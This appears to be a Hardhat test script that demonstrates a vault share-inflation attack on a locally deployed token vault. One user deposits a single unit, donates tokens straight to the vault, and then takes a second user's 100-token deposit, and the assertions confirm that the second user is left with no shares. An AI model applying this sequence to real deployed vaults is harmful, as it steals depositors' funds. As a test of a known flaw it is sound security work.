import "@nomicfoundation/hardhat-ethers";
import { ethers } from "hardhat";
import { expect } from "chai";
import { parseEther } from "ethers";

describe("Vault Inflation Attack Test", function () {
    let token: any;
    let vault: any;
    let deployer: any;
    let user0: any;
    let user1: any;
    // Use ethers provided max uint256 constant (works with ethers v6 via Hardhat)
    const UINT256_MAX = ethers.MaxUint256;

    beforeEach(async function () {
        [deployer, user0, user1] = await ethers.getSigners();

        // Deploy Token
        const TokenFactory = await ethers.getContractFactory("MyToken");
        token = await TokenFactory.deploy();
        await token.waitForDeployment();

        // Deploy Vault
        const VaultFactory = await ethers.getContractFactory("Vault");
        vault = await VaultFactory.deploy(await token.getAddress());
        await vault.waitForDeployment();

        // Mint tokens to users
        await token.mint(await user0.getAddress(), parseEther("200"));
        await token.mint(await user1.getAddress(), parseEther("200"));

        // Approve vault to spend tokens
        await token.connect(user0).approve(await vault.getAddress(), UINT256_MAX);
        await token.connect(user1).approve(await vault.getAddress(), UINT256_MAX);
    });

    async function print() {
        console.log("======print result======");
        // user0 balance
        console.log("user0 balance=>", await token.balanceOf(await user0.getAddress()));
        // user1 balance
        console.log("user1 balance=>", await token.balanceOf(await user1.getAddress()));
        // user0 share
        console.log("user0 share=>", await vault.balanceOf(await user0.getAddress()));
        // user1 share
        console.log("user1 share=>", await vault.balanceOf(await user1.getAddress()));
        // vault share
        console.log("vault share=>", await vault.totalSupply());
    }

    it("should demonstrate inflation attack", async function () {
        // User 0 deposits 1
        await vault.connect(user0).deposit(1);
        await print();

        // User 0 transfer 100 * 1e18
        await token.connect(user0).transfer(await vault.getAddress(), parseEther("100"));
        await print();

        // User 1 deposits 100 * 1e18
        await vault.connect(user1).deposit(parseEther("100"));
        await print();

        // User 0 withdraws all
        await vault.connect(user0).withdraw(1);
        await print();

        // Assert final state
        expect(await token.balanceOf(await user0.getAddress())).to.equal(parseEther("300"));
        expect(await vault.balanceOf(await user1.getAddress())).to.equal(0);
    });
});
